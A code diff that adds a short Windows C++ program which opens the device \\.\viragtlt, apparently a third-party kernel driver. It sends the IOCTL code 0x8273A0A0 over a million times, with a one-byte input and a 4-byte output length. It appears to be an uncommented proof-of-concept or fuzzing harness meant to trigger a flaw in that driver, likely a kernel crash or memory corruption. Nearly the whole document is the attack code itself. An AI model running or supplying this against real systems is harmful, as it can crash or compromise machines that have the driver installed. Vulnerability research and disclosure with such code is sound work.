@@ -1,0 +1,30 @@
+#include "stdafx.h"
+#include <stdio.h>
+#include <windows.h>
+
+
+int main(int argc, char *argv[]) 
+{
+	HANDLE     hDevice;
+	DWORD      dwRetBytes = 0;  
+	char szinput[0x1] = {0};
+	memset(szinput, 0x41, 1);
+
+	hDevice = CreateFile("\\\\.\\viragtlt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+
+	for (int j = 0; j < 20; j++)
+	{
+		for ( int i = 0; i < 0xFFFF; ++i )
+		{
+			char *lpOutBuffer = new char[i];
+			memset(lpOutBuffer, 65, i);
+			DeviceIoControl(hDevice, 0x8273A0A0,szinput, 1u, lpOutBuffer, 4u, &dwRetBytes, 0);
+			delete[] lpOutBuffer;
+		}
+	}
+	
+
+
+	CloseHandle(hDevice); 
+	return 0;
+}
